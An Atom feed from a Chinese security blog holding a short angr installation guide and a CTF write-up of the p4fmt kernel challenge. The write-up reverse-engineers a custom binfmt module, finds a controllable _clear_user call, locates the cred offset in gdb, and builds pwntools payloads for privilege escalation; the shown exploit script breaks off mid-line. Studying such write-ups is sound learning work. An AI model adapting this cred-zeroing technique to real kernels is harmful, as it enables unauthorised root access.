<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ordin</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://leave-devour.github.io/"/>
  <updated>2020-02-12T11:44:52.043Z</updated>
  <id>https://leave-devour.github.io/</id>
  
  <author>
    <name>Ordin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>angr安装</title>
    <link href="https://leave-devour.github.io/2020/02/12/angr%E5%AE%89%E8%A3%85/"/>
    <id>https://leave-devour.github.io/2020/02/12/angr%E5%AE%89%E8%A3%85/</id>
    <published>2020-02-12T11:35:31.000Z</published>
    <updated>2020-02-12T11:44:52.043Z</updated>
    
    <content type="html"><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info"></a><center>info</center></h2><a id="more"></a><h3 id="首先安装运行的虚拟环境"><a href="#首先安装运行的虚拟环境" class="headerlink" title="首先安装运行的虚拟环境"></a>首先安装运行的虚拟环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-virtualenv</span><br><span class="line">sudo pip install virtualenvwrapper</span><br><span class="line">必须得python 3.6以上</span><br></pre></td></tr></table></figure><h3 id="查找virtualenvwrapper-sh的路径"><a href="#查找virtualenvwrapper-sh的路径" class="headerlink" title="查找virtualenvwrapper.sh的路径"></a>查找virtualenvwrapper.sh的路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><h3 id="修改环境变量"><a href="#修改环境变量" class="headerlink" title="修改环境变量"></a>修改环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line">export WORKON_HOME=$HOME/.virtualenvs</span><br><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="然后创建一个环境，再安装angr"><a href="#然后创建一个环境，再安装angr" class="headerlink" title="然后创建一个环境，再安装angr"></a>然后创建一个环境，再安装angr</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv angr</span><br><span class="line">sudo pip3 install angr</span><br></pre></td></tr></table></figure><p>这样就成功了</p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><h4 id="pip：Import-Error-cannot-import-name-main"><a href="#pip：Import-Error-cannot-import-name-main" class="headerlink" title="pip：Import Error:cannot import name main"></a>pip：Import Error:cannot import name main</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解决方案</span><br><span class="line">1、 from pip._internal import main</span><br><span class="line">2、 </span><br><span class="line">from pip import __main__</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    sys.exit(__main__._main())</span><br></pre></td></tr></table></figure><h4 id="TypeError-new-got-an-unexpected-keyword-argument-‘serialized-options’"><a href="#TypeError-new-got-an-unexpected-keyword-argument-‘serialized-options’" class="headerlink" title="TypeError: new() got an unexpected keyword argument ‘serialized_options’"></a>TypeError: <strong>new</strong>() got an unexpected keyword argument ‘serialized_options’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在终端上的 protoc 版本 与pycharm 中用conda 安装的protobuf版本不一样。</span><br><span class="line">然后在终端上进行proto文件编译，在pycharm上运行相关脚本，出现以上错误。</span><br><span class="line">在pycharm中调整protobuf的版本后错误消失。</span><br><span class="line">pip uninstall protobuf</span><br><span class="line">pip install protobuf</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;info&quot;&gt;&lt;a href=&quot;#info&quot; class=&quot;headerlink&quot; title=&quot;info&quot;&gt;&lt;/a&gt;&lt;center&gt;info&lt;/center&gt;&lt;/h2&gt;
    
    </summary>
    
    
      <category term="tools" scheme="https://leave-Devour.github.io/categories/tools/"/>
    
    
      <category term="auto" scheme="https://leave-Devour.github.io/tags/auto/"/>
    
  </entry>
  
  <entry>
    <title>p4fmt TeaserCONFidence2019 CTF </title>
    <link href="https://leave-devour.github.io/2020/02/12/p4fmt-TeaserCONFidence2019-CTF/"/>
    <id>https://leave-devour.github.io/2020/02/12/p4fmt-TeaserCONFidence2019-CTF/</id>
    <published>2020-02-12T05:11:09.000Z</published>
    <updated>2020-02-12T09:51:38.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info"></a><center>info</center></h2><a id="more"></a><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>有三个文件<br><code>bzImage  initramfs.cpio.gz  run.sh</code><br>run.sh:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1   │ #!/bin/bash</span><br><span class="line">2   │ qemu-system-x86_64 -kernel ./bzImage \</span><br><span class="line">3   │         -initrd ./initramfs.cpio.gz \</span><br><span class="line">4   │         -nographic \</span><br><span class="line">5   │         -append &quot;console=ttyS0&quot; \</span><br></pre></td></tr></table></figure><p>启动qemu脚本，里面有给的提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">====================</span><br><span class="line">p4fmt</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Kernel challs are always a bit painful.</span><br><span class="line">No internet access, no SSH, no file copying.</span><br><span class="line"></span><br><span class="line">You&apos;re stuck with copy pasting base64&apos;d (sometimes static) ELFs.</span><br><span class="line">But what if there was another solution?</span><br><span class="line"></span><br><span class="line">We&apos;ve created a lightweight, simple binary format for your</span><br><span class="line">pwning pleasure. It&apos;s time to prove your skills.</span><br></pre></td></tr></table></figure><p>可以看到，这个说给出了一个新的<code>二进制格式</code><br>目录下面有一个 <code>p4fmt.ko</code><br>p4fmt.ko</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">里面注册了四个函数</span><br><span class="line">load_p4_binary</span><br><span class="line">load_p4_binary_cold_2</span><br><span class="line">p4fmt_init</span><br><span class="line">p4fmt_exit</span><br></pre></td></tr></table></figure><p>p4fmt_init 和 p4fmt_exit 分别注册和注销 一个文件格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">p4fmt_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _register_binfmt(&amp;p4format, <span class="number">1L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line">__<span class="function">int64 <span class="title">p4fmt_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> unregister_binfmt(&amp;p4format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看看 load_p4_binary_cold_2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:000000000000018E load_p4_binary_cold_2 proc near         ; CODE XREF: load_p4_binary:loc_47↑j</span><br><span class="line">.text.unlikely:000000000000018E                 mov     rdi, offset unk_275</span><br><span class="line">.text.unlikely:0000000000000195                 mov     ebp, 0FFFFFFF8h</span><br><span class="line">.text.unlikely:000000000000019A                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:000000000000019F                 jmp     loc_65</span><br><span class="line">.text.unlikely:000000000000019F load_p4_binary_cold_2 endp</span><br><span class="line"></span><br><span class="line">.rodata.str1.1:0000000000000275 unk_275         db    1                 ; DATA XREF: load_p4_binary_cold_2↑o</span><br><span class="line">.rodata.str1.1:0000000000000276                 db  37h ; 7</span><br><span class="line">.rodata.str1.1:0000000000000277                 db  55h ; U</span><br><span class="line">.rodata.str1.1:0000000000000278                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:0000000000000279                 db  6Bh ; k</span><br><span class="line">.rodata.str1.1:000000000000027A                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:000000000000027B                 db  6Fh ; o</span><br><span class="line">.rodata.str1.1:000000000000027C                 db  77h ; w</span><br><span class="line">.rodata.str1.1:000000000000027D                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:000000000000027E                 db  20h</span><br><span class="line">.rodata.str1.1:000000000000027F                 db  76h ; v</span><br><span class="line">.rodata.str1.1:0000000000000280                 db  65h ; e</span><br><span class="line">.rodata.str1.1:0000000000000281                 db  72h ; r</span><br><span class="line">.rodata.str1.1:0000000000000282                 db  73h ; s</span><br><span class="line">.rodata.str1.1:0000000000000283                 db  69h ; i</span><br><span class="line">.rodata.str1.1:0000000000000284                 db  6Fh ; o</span><br><span class="line">.rodata.str1.1:0000000000000285                 db  6Eh ; n</span><br><span class="line">.rodata.str1.1:0000000000000286                 db  0Ah</span><br><span class="line">.rodata.str1.1:0000000000000287                 db    0</span><br><span class="line">.rodata.str1.1:0000000000000287 _rodata_str1_1  ends</span><br><span class="line"></span><br><span class="line">明显这个是一个版本错误的info</span><br><span class="line">然后退出</span><br></pre></td></tr></table></figure><p>想来这个load_p4_binary才是关键的，仔细看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000                 push    r15</span><br><span class="line">.text:0000000000000002                 mov     ecx, 2</span><br><span class="line">.text:0000000000000007                 mov     rsi, offset P4 \\P4，相当于一个magic </span><br><span class="line">.text:000000000000000E                 push    r14</span><br><span class="line">.text:0000000000000010                 push    r13</span><br><span class="line">.text:0000000000000012                 push    r12</span><br><span class="line">.text:0000000000000014                 lea     r12, [rdi+48h]</span><br><span class="line">.text:0000000000000018                 push    rbp</span><br><span class="line">.text:0000000000000019                 push    rbx</span><br><span class="line">.text:000000000000001A                 mov     rbx, rdi</span><br><span class="line">.text:000000000000001D                 mov     rdi, r12</span><br><span class="line">.text:0000000000000020                 mov     r14, gs:current_task</span><br><span class="line">.text:0000000000000029                 sub     rsp, 8</span><br><span class="line">.text:000000000000002D                 mov     r13, [r14+2A0h]</span><br><span class="line">.text:0000000000000034                 repe cmpsb</span><br><span class="line">.text:0000000000000036                 setnbe  al      \\ 从 0x48开始判断，这里判断前面两字节是否相等</span><br><span class="line">.text:0000000000000039                 sbb     al, 0</span><br><span class="line">.text:000000000000003B                 test    al, al</span><br><span class="line">.text:000000000000003D                 jnz     loc_184</span><br><span class="line">.text:0000000000000043                 cmp     byte ptr [rbx+4Ah], 0 \\这些判断版本是否正确，version = 0</span><br><span class="line">.text:0000000000000047</span><br><span class="line">.text:0000000000000047 loc_47:</span><br><span class="line">.text:0000000000000047                 jnz     load_p4_binary_cold_2</span><br><span class="line">.text:000000000000004D                 cmp     byte ptr [rbx+4Bh], 1 \\ 0x4b这个byte 不能大于1</span><br><span class="line">.text:0000000000000051                 ja      loc_17A</span><br><span class="line">.text:0000000000000057                 mov     rdi, rbx</span><br><span class="line">.text:000000000000005A                 call    flush_old_exec  ; PIC mode</span><br><span class="line"></span><br><span class="line">flush_old_exec:</span><br><span class="line">停止当前进程内的所有线程，清空当前内存空间，重置各种状态</span><br></pre></td></tr></table></figure><p>接下来有两种处理方式，由<code>0x4b</code>byte 决定,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)(v6 + <span class="number">0x80</span>) = <span class="number">0x800000</span>;</span><br><span class="line">setup_new_exec(v4); <span class="comment">//</span></span><br><span class="line">v12 = *(_BYTE *)(v4 + <span class="number">75</span>); \\ <span class="number">0x4b</span> == <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-22</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(v4 + <span class="number">76</span>) ) </span><br><span class="line">      &#123;<span class="comment">//  v3 = a1 + 0x48;</span></span><br><span class="line">        v16 = (__int64 *)(*(_QWORD *)(v4 + <span class="number">80</span>) + v3); <span class="comment">//  0x50 是一个偏移，</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v17 = *v16;  <span class="comment">// v16 指向一个信息chunk</span></span><br><span class="line">          v18 = *v16 &amp; <span class="number">7</span>;</span><br><span class="line">          v19 = *v16 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;       <span class="comment">// load_addr </span></span><br><span class="line">          printk(<span class="string">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)\n"</span>, v19, v16[<span class="number">1</span>], v16[<span class="number">2</span>], v18);</span><br><span class="line">          v20 = v16[<span class="number">2</span>];</span><br><span class="line">          v21 = v16[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> ( v17 &amp; <span class="number">8</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(<span class="number">0L</span>L, v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">            printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, *v16, v16[<span class="number">1</span>], v22, v23);</span><br><span class="line">            _clear_user(*v16, v16[<span class="number">1</span>]); </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(*(_QWORD *)(v4 + <span class="number">8</span>), v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v10;</span><br><span class="line">          v16 += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( *(_DWORD *)(v4 + <span class="number">76</span>) &gt; v10 );  <span class="comment">// do while v10初始值为0 所以 0x4c应该就是一个数量，然后vm_mmap 空间</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                                            <span class="comment">// 0x4b = 0</span></span><br><span class="line">    &#123; </span><br><span class="line">      v13 = <span class="number">-12L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)vm_mmap(</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">80</span>),</span><br><span class="line">                               <span class="number">4096L</span>L,</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">80</span>) &amp; <span class="number">7L</span>L,</span><br><span class="line">                               <span class="number">2L</span>L,</span><br><span class="line">                               <span class="number">0L</span>L) &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        install_exec_creds(v4); <span class="comment">//为新进程安装用户凭证</span></span><br><span class="line">        set_binfmt(&amp;p4format); <span class="comment">//应该就是注册一个格式在这个新的进程内</span></span><br><span class="line">        v14 = <span class="number">0x7FFFFFFFF000</span>LL;</span><br><span class="line">        v15 = __readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task);</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)v15 &amp; <span class="number">0x20000000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = <span class="number">3221225472L</span>L;</span><br><span class="line">          <span class="keyword">if</span> ( !(*(_BYTE *)(v15 + <span class="number">131</span>) &amp; <span class="number">8</span>) )</span><br><span class="line">            v14 = <span class="number">4294959104L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = setup_arg_pages(v4, v14, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          finalize_exec(v4);</span><br><span class="line">          start_thread( </span><br><span class="line">            v9 + <span class="number">16216</span>,</span><br><span class="line">            v13,</span><br><span class="line">            *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">256</span>) + <span class="number">40L</span>L));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = *(_QWORD *)(v4 + <span class="number">0x58</span>); <span class="comment">// entry</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>setup_new_exec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup_new_exec()来初始化它的状态，它会检查新程序是否可以生成core dump文件或者是否能通过ptrace attach到新进程，对于标记了setuid和setgid的程序默认是不会生成core dump文件，如果当前用户凭证没有权限读取可执行文件时也不会生成core dump文件</span><br></pre></td></tr></table></figure><p>start_thread</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void start_thread(struct pt_regs *regs, unsigned long new_ip, unsigned long new_sp)</span><br></pre></td></tr></table></figure><p>所以 v13应该是entry<br>所以这个文件的格式就很明确了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P4\x00 version type count offset entry struct(chunk)</span><br></pre></td></tr></table></figure><p>程序的流程大概清晰。<br>然后在发现<code>install_exec_creds</code> 这个函数会调用 comimit_cred</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">install_exec_creds</span><span class="params">(struct linux_binprm *bprm)</span> <span class="comment">//bprm 可以控制</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">security_bprm_committing_creds(bprm);</span><br><span class="line"></span><br><span class="line">commit_creds(bprm-&gt;cred);</span><br><span class="line">bprm-&gt;cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Disable monitoring for regular users</span></span><br><span class="line"><span class="comment"> * when executing setuid binaries. Must</span></span><br><span class="line"><span class="comment"> * wait until new credentials are committed</span></span><br><span class="line"><span class="comment"> * by commit_creds() above</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (get_dumpable(current-&gt;mm) != SUID_DUMP_USER)</span><br><span class="line">perf_event_exit_task(current);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cred_guard_mutex must be held at least to this point to prevent</span></span><br><span class="line"><span class="comment"> * ptrace_attach() from altering our determination of the task's</span></span><br><span class="line"><span class="comment"> * credentials; any time after this it may be unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">security_bprm_committed_creds(bprm);</span><br><span class="line">mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们能控制bprm-cred，然后清零。<br>就能成功提取了<br>想到 前面的offset可以控制，那是不是说明 load_addr 可以控制？<br>clear_user — Zero a block of memory in user space.<br><code>_clear_user(*v16, v16[1]);</code> v16很明显可以控制，那就是说通过offset指到 cred那，然后清零就能成功提权了</p><p>接下来就开始Debug</p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>先提取出 <code>vmlinux</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z2x initramfs.cpio.gz</span><br></pre></td></tr></table></figure><p>再修改run.sh 使得gdb 可以连上去<br>现在先测试下刚刚得出来的 文件格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">       │ File: exp.py</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">1</span>   │ <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">   <span class="number">2</span>   │ </span><br><span class="line">   <span class="number">3</span>   │ payload  = <span class="string">"P4\x00"</span></span><br><span class="line">   <span class="number">4</span>   │ payload += <span class="string">"\x01"</span></span><br><span class="line">   <span class="number">5</span>   │ payload += p32(<span class="number">1</span>)</span><br><span class="line">   <span class="number">6</span>   │ payload += p64(<span class="number">0x90</span>)</span><br><span class="line">   <span class="number">7</span>   │ payload += p64(<span class="number">0</span>)</span><br><span class="line">   <span class="number">8</span>   │ payload += <span class="string">"Ordin"</span></span><br><span class="line">   <span class="number">9</span>   │ <span class="keyword">print</span> payload.encode(<span class="string">'base64'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[  160.994444] vm_mmap(load_addr=0x0, length=0xffff8880071fe3c0, offset=0x0, prot=0)</span><br><span class="line">[  161.008003] Ordin[531]: segfault at 0 ip 0000000000000000 sp 00007fffffffefaa error 14</span><br><span class="line">[  161.015835] Code: Bad RIP value.</span><br></pre></td></tr></table></figure><p>发现是成功的<br>然后再去寻找cred的偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/modules </span><br><span class="line">p4fmt 16384 0 - Live 0xffffffffc0000000 (O)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; add-symbol-file ./p4fmt.ko 0xffffffffc0000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt;  b *0xffffffffc00000af</span><br><span class="line"></span><br><span class="line"> ► 0xffffffff81189ec0    push   rbx</span><br><span class="line">   0xffffffff81189ec1    mov    rbx, rdi</span><br><span class="line">   0xffffffff81189ec4    call   0xffffffff81297aa0</span><br><span class="line"> </span><br><span class="line">   0xffffffff81189ec9    mov    rdi, qword ptr [rbx + 0xe0]</span><br><span class="line">   0xffffffff81189ed0    call   0xffffffff81073d30</span><br><span class="line"></span><br><span class="line">两个call  再对比下源码</span><br><span class="line">可以知道是第二个call</span><br><span class="line">void install_exec_creds(struct linux_binprm *bprm)</span><br><span class="line">&#123;</span><br><span class="line">security_bprm_committing_creds(bprm);</span><br><span class="line"></span><br><span class="line">commit_creds(bprm-&gt;cred);</span><br><span class="line">rdi 是传入的参数 可以知道 cred的偏移是0xe0</span><br><span class="line">然后因为传进去的是 v4</span><br><span class="line"></span><br><span class="line">所以 cred的距离文件头P4的偏移是 0xe0-0x48 = 0x98</span><br></pre></td></tr></table></figure><p>在调试的过程中，我发现其实成功提权的机率不算特别高。看运气的啦<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch = <span class="string">'amd64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(addr)</span>:</span></span><br><span class="line">    </span><br><span class="line">    payload  = <span class="string">"P4"</span></span><br><span class="line">    payload +=p8(<span class="number">0</span>)</span><br><span class="line">    payload += <span class="string">"\x01"</span></span><br><span 